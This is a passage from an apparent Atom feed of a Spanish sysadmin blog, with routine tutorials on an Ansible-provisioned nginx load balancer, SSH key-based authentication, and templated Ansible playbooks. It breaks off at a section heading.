changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;item&lt;/span&gt;&lt;span class="o"&gt;=[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;uwsgi-emperor&amp;#39;&lt;/span&gt;, u&lt;span class="s1"&gt;&amp;#39;uwsgi-plugin-python&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;item&lt;/span&gt;&lt;span class="o"&gt;=[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;uwsgi-emperor&amp;#39;&lt;/span&gt;, u&lt;span class="s1"&gt;&amp;#39;uwsgi-plugin-python&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;file&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3                 : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4                 : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya podríamos hacer peticiones al puerto para obtener respuestas adecuadas.&lt;/p&gt;
&lt;h3&gt;El balanceador&lt;/h3&gt;
&lt;p&gt;Vamos a utilizar &lt;strong&gt;nginx&lt;/strong&gt; con una configuración propia de balanceador, que también necesitamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat files/balancer 
upstream servers &lt;span class="o"&gt;{&lt;/span&gt;
    server &lt;span class="m"&gt;172&lt;/span&gt;.17.0.3:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server &lt;span class="m"&gt;172&lt;/span&gt;.17.0.4:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://servers&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@ansible:~# cat balancer.yml 
- hosts: balancer
  gather_facts: &lt;span class="nb"&gt;false&lt;/span&gt;
  tasks:
    - apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx-light &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;installed
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
    - file: &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/default &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;absent
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;files/balancer &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/balancer
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;reloaded
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos lo suficiente para lanzar la provisión. Allá vamos!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook -i hosts balancer.yml 

PLAY ***************************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;apt&lt;span class="o"&gt;]&lt;/span&gt; *********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;file&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2                 : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se puede verificar que funciona lanzando peticiones al puerto 80 de esta máquina.&lt;/p&gt;
&lt;h2&gt;Comprobación del resultado&lt;/h2&gt;
&lt;p&gt;La mala noticia es que la red 172.17.0.0/16 es privada, y no podemos acceder a ella a menos que sea desde un contenedor. La buena, es que tuvimos la previsión de publicar el puerto 80 del contenedor, mapeado en el puerto 8000 del &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Así pues, es como si el puerto 80 del balanceador fuera el puerto 8000 de nuestra máquina. Basta con hacer algunas peticiones para darse cuenta de que tenemos las máquinas perfectamente funcionales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ curl http://localhost:8000/
Hello from server1
gerard@sirius:~/build$ curl http://localhost:8000/
Hello from server2
gerard@sirius:~/build$ curl http://localhost:8000/
Hello from server1
gerard@sirius:~/build$ curl http://localhost:8000/
Hello from server2
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="docker"></category><category term="dockerfile"></category><category term="ansible"></category><category term="playbook"></category></entry><entry><title>Autenticación SSH por claves</title><link href="https://www.linuxsysadmin.ml/2016/05/autenticacion-ssh-por-claves.html" rel="alternate"></link><published>2016-05-30T08:00:00+02:00</published><updated>2016-05-30T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-05-30:/2016/05/autenticacion-ssh-por-claves.html</id><summary type="html">&lt;p&gt;A pesar de que el protocolo &lt;strong&gt;SSH&lt;/strong&gt; es lo que mas seguridad ofrece hoy en día, un servidor rápido puede probar gran cantidad de contraseñas generadas mediante un generador por fuerza bruta. Para añadir mas seguridad podemos autenticar mediante claves en vez de usar contraseña, opcionalmente protegidos con una &lt;em&gt;passphrase …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;A pesar de que el protocolo &lt;strong&gt;SSH&lt;/strong&gt; es lo que mas seguridad ofrece hoy en día, un servidor rápido puede probar gran cantidad de contraseñas generadas mediante un generador por fuerza bruta. Para añadir mas seguridad podemos autenticar mediante claves en vez de usar contraseña, opcionalmente protegidos con una &lt;em&gt;passphrase&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La idea es que un cliente del servidor &lt;strong&gt;SSH&lt;/strong&gt; se autentique reemplazando la contraseña habitual por una clave, previamente generada y con su parte pública compartida con anterioridad.&lt;/p&gt;
&lt;h2&gt;Disposición inicial&lt;/h2&gt;
&lt;p&gt;Para la demostración tenemos dos servidores, con los roles claramente especificados en el nombre:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME       STATE    IPV4      IPV6  AUTOSTART
---------------------------------------------
client     RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3  -     NO
sshserver  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2  -     NO
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En el caso del servidor, necesitamos un servidor &lt;strong&gt;SSH&lt;/strong&gt; levantado y listo para recibir nuevas sesiones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:22              &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;76&lt;/span&gt;/sshd
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      &lt;span class="m"&gt;76&lt;/span&gt;/sshd
root@sshserver:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear un usuario con el que podamos entrar en el servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# grep gerard /etc/passwd
gerard:x:1000:1000:,,,:/home/gerard:/bin/bash
root@sshserver:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si intentamos entrar en el servidor desde la máquina cliente, vemos que se nos pide la contraseña, tras lo cual iniciamos la sesión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ssh gerard@10.0.0.2
gerard@10.0.0.2&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password:

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gerard@sshserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, si lo volvemos a intentar, se nos pedirá la &lt;em&gt;password&lt;/em&gt; una y otra vez.&lt;/p&gt;
&lt;h2&gt;Montando el par de claves&lt;/h2&gt;
&lt;p&gt;Desde la máquina cliente, generamos el par de claves mediante el comando &lt;strong&gt;ssh-keygen&lt;/strong&gt;. Sin parámetros va a generar un clave tipo &lt;strong&gt;RSA&lt;/strong&gt;, que ya nos vale.&lt;/p&gt;
&lt;p&gt;Es importante indicar que la &lt;em&gt;passphrase&lt;/em&gt; es más segura que la &lt;em&gt;password&lt;/em&gt;, y que la necesidad de la clave convierte el combo en lo mas seguro de lo que disponemos. Vamos a dejarla en blanco para asegurar la autenticación con claves sin &lt;em&gt;passphrase&lt;/em&gt;, por comodidad nuestra.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key &lt;span class="o"&gt;(&lt;/span&gt;/root/.ssh/id_rsa&lt;span class="o"&gt;)&lt;/span&gt;:
Enter passphrase &lt;span class="o"&gt;(&lt;/span&gt;empty &lt;span class="k"&gt;for&lt;/span&gt; no passphrase&lt;span class="o"&gt;)&lt;/span&gt;:
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
&lt;span class="m"&gt;58&lt;/span&gt;:6b:38:71:82:a4:b2:97:4d:cc:6d:cd:43:6d:26:00 root@client
The key&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s randomart image is:
+---&lt;span class="o"&gt;[&lt;/span&gt;RSA &lt;span class="m"&gt;2048&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;----+
&lt;span class="p"&gt;|&lt;/span&gt;    E.....       &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; o +. +      &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;. . &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; *+       &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; o + . B o       &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;. o . + S        &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; .     o         &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;                 &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;                 &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;                 &lt;span class="p"&gt;|&lt;/span&gt;
+-----------------+
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos ha generado el par de claves en la carpeta que nos preguntó el comando de generación. En este caso dejamos los valores por defecto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ls -1 .ssh/
id_rsa
id_rsa.pub
known_hosts
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que tenemos dos ficheros nuevos. El fichero &lt;em&gt;id_rsa&lt;/em&gt; es la clave privada, y es una parte que nunca debe compartirse. El fichero &lt;em&gt;id_rsa.pub&lt;/em&gt; es la parte pública de la clave y es la que debemos repartir a los servidores a los que pretendamos tener acceso con la clave.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# cat .ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHR7HSGhP8afT1pz/no+qVT1uKsEhh4CZXIbDebibbKiyPYVaKl/FLovYnCwk0IWXAsiJB1eXkQhX0he0gSK66UIZFnKVr8+G1J1kg9zuqxFTxpJTrM2WbdTZ+nk3bNgKTFKiQNsZ/IMvb/vjgU365LNtDclnajto0scgSCZQBvDfxrNVH8NIyv4IBTKheD6oSNgQsmzpvbWRyKBZf3dRRdVH00tsIC20fdAONtNfcWNToakRMX0/svW7RxUDlJEU/icsm3lf6xRf927CdB0ziu90i9mpzCxTMP3xbsrOJ0/mtdqROjql+OHNvxJa8FOtvX/ZdkNRAPOvuo4AieLZp root@client
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para garantizar el acceso a nuestro servidor, debemos poner una nueva línea en el fichero &lt;em&gt;authorized_keys&lt;/em&gt; del usuario remoto, que es la parte pública de la clave. Es especialmente importante que la carpeta &lt;em&gt;.ssh&lt;/em&gt; exista y no tenga permisos para nada ni nadie aparte del usuario propietario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sshserver:~$ mkdir .ssh
gerard@sshserver:~$ chmod &lt;span class="m"&gt;700&lt;/span&gt; .ssh/
gerard@sshserver:~$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHR7HSGhP8afT1pz/no+qVT1uKsEhh4CZXIbDebibbKiyPYVaKl/FLovYnCwk0IWXAsiJB1eXkQhX0he0gSK66UIZFnKVr8+G1J1kg9zuqxFTxpJTrM2WbdTZ+nk3bNgKTFKiQNsZ/IMvb/vjgU365LNtDclnajto0scgSCZQBvDfxrNVH8NIyv4IBTKheD6oSNgQsmzpvbWRyKBZf3dRRdVH00tsIC20fdAONtNfcWNToakRMX0/svW7RxUDlJEU/icsm3lf6xRf927CdB0ziu90i9mpzCxTMP3xbsrOJ0/mtdqROjql+OHNvxJa8FOtvX/ZdkNRAPOvuo4AieLZp root@client
gerard@sshserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pueden haber varias claves públicas en el fichero &lt;em&gt;authorized_keys&lt;/em&gt;, para garantizar la autenticación desde diferentes lugares sin compartir las claves entre los servidores de  origen.&lt;/p&gt;
&lt;h2&gt;Comprobando su funcionamiento&lt;/h2&gt;
&lt;p&gt;Para ver que todo funciona, basta con intentar entrar en la sesión; si todo va bien, no nos va a pedir &lt;em&gt;password&lt;/em&gt; sino &lt;em&gt;passphrase&lt;/em&gt;, suponiendo que no la dejáramos en blanco.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ssh gerard@10.0.0.2

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu May &lt;span class="m"&gt;19&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:11:51 &lt;span class="m"&gt;2016&lt;/span&gt; from &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
gerard@sshserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, si ponemos el &lt;em&gt;flag&lt;/em&gt; de &lt;em&gt;verbose&lt;/em&gt;, vemos que el servidor origen &lt;strong&gt;ofrece&lt;/strong&gt; automáticamente la clave generada. Si la clave no estuviera en los sitios normales, habría que indicarlo en el comando &lt;strong&gt;ssh&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ssh -v gerard@10.0.0.2
...
debug1: Connecting to &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2&lt;span class="o"&gt;]&lt;/span&gt; port &lt;span class="m"&gt;22&lt;/span&gt;.
debug1: Connection established.
...
debug1: Authentications that can &lt;span class="k"&gt;continue&lt;/span&gt;: publickey,password
debug1: Next authentication method: publickey
debug1: Offering RSA public key: /root/.ssh/id_rsa
...
debug1: Authentication succeeded &lt;span class="o"&gt;(&lt;/span&gt;publickey&lt;span class="o"&gt;)&lt;/span&gt;.
...
gerard@sshserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante recalcar que la parte privada que se ofrece es la que hay en la carpeta del usuario del servidor origen, pero la validación se hace con el fichero &lt;em&gt;authorized_keys&lt;/em&gt; del usuario en el servidor remoto.&lt;/p&gt;</content><category term="linux"></category><category term="ssh"></category><category term="autenticación"></category><category term="password"></category><category term="passphrase"></category><category term="rsa"></category></entry><entry><title>Algunas ideas sueltas sobre Ansible</title><link href="https://www.linuxsysadmin.ml/2016/05/algunas-ideas-sueltas-sobre-ansible.html" rel="alternate"></link><published>2016-05-09T08:00:00+02:00</published><updated>2016-05-09T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-05-09:/2016/05/algunas-ideas-sueltas-sobre-ansible.html</id><summary type="html">&lt;p&gt;En un &lt;a href="https://www.linuxsysadmin.ml/2016/04/instalando-ansible-para-gestionar-servidores.html"&gt;artículo anterior&lt;/a&gt; vimos qué era &lt;strong&gt;Ansible&lt;/strong&gt; y como instalarlo, dejando su funcionamiento para el lector; Hay miles de tutoriales por internet, y muchos son mejores de los que pueda poner aquí. Sin embargo, hay algunas ideas que no son fáciles de ver juntas, así que aquí las dejo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En un &lt;a href="https://www.linuxsysadmin.ml/2016/04/instalando-ansible-para-gestionar-servidores.html"&gt;artículo anterior&lt;/a&gt; vimos qué era &lt;strong&gt;Ansible&lt;/strong&gt; y como instalarlo, dejando su funcionamiento para el lector; Hay miles de tutoriales por internet, y muchos son mejores de los que pueda poner aquí. Sin embargo, hay algunas ideas que no son fáciles de ver juntas, así que aquí las dejo.&lt;/p&gt;
&lt;h2&gt;Playbooks plantilla&lt;/h2&gt;
&lt;p&gt;Si solo queremos los &lt;em&gt;playbooks&lt;/em&gt; como una manera fácil de aprovisionar una máquina, nos conviene que no tenga un &lt;em&gt;host&lt;/em&gt; asignado en el mismo, para poder pasar el objetivo por parámetro. Por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat ping.yml
- hosts: &lt;span class="s1"&gt;&amp;#39;{{ target }}&amp;#39;&lt;/span&gt;
  tasks:
    - ping:
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso hay que pasar un argumento extra como &lt;em&gt;target&lt;/em&gt;, y en caso de no ponerlo, el &lt;em&gt;playbook&lt;/em&gt; no haría nada. Con este truco, podemos ir variando el objetivo, siempre que esté en el fichero &lt;em&gt;hosts&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook ping.yml

PLAY &lt;span class="o"&gt;[{{&lt;/span&gt; target &lt;span class="o"&gt;}}]&lt;/span&gt; ***********************************************************
skipping: no hosts matched

PLAY RECAP ********************************************************************

root@ansible:~# ansible-playbook ping.yml --extra-vars &lt;span class="s2"&gt;&amp;quot;target=appservers&amp;quot;&lt;/span&gt;

PLAY &lt;span class="o"&gt;[&lt;/span&gt;appservers&lt;span class="o"&gt;]&lt;/span&gt; *************************************************************

GATHERING FACTS ***************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt;
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4&lt;span class="o"&gt;]&lt;/span&gt;

TASK: &lt;span class="o"&gt;[&lt;/span&gt;ping &lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4&lt;span class="o"&gt;]&lt;/span&gt;
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP ********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~# ansible-playbook ping.yml --extra-vars &lt;span class="s2"&gt;&amp;quot;target=10.0.0.3&amp;quot;&lt;/span&gt;

PLAY &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt; ***************************************************************

GATHERING FACTS ***************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt;

TASK: &lt;span class="o"&gt;[&lt;/span&gt;ping &lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP ********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Variar el entorno sin cambiar los playbooks&lt;/h2&gt;
